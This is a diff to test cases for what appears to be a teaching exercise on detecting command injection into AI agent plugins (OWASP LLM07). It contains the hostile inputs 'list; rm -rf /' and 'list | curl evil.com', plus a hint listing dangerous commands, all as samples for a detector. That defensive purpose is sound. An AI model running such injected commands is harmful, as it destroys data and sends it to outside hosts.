@@ -40,9 +40,9 @@ This demonstrates OWASP LLM07 (Insecure Plugin Design) and why AI agents need in
   },
 
   testCases: [
-    { id: 1, input: 'list files', expected: '{"safe": true, "risk_score": 0.12}', explanation: 'Safe command.' },
-    { id: 2, input: 'list; rm -rf /', expected: '{"safe": false, "risk_score": 0.96}', explanation: 'Critical injection attempt.' },
-    { id: 3, input: 'list | curl evil.com', expected: '{"safe": false, "risk_score": 0.89}', explanation: 'Data exfiltration attempt.' }
+    { input: 'list files', expected: '{"safe": true, "risk_score": 0.12}', explanation: 'Safe command.' },
+    { input: 'list; rm -rf /', expected: '{"safe": false, "risk_score": 0.96}', explanation: 'Critical injection attempt.' },
+    { input: 'list | curl evil.com', expected: '{"safe": false, "risk_score": 0.89}', explanation: 'Data exfiltration attempt.' }
   ],
 
   hints: ['Check for: ; | && || $( ) `` < >', 'Dangerous commands: rm, curl, wget, bash, eval, exec', 'Multiple indicators compound risk']
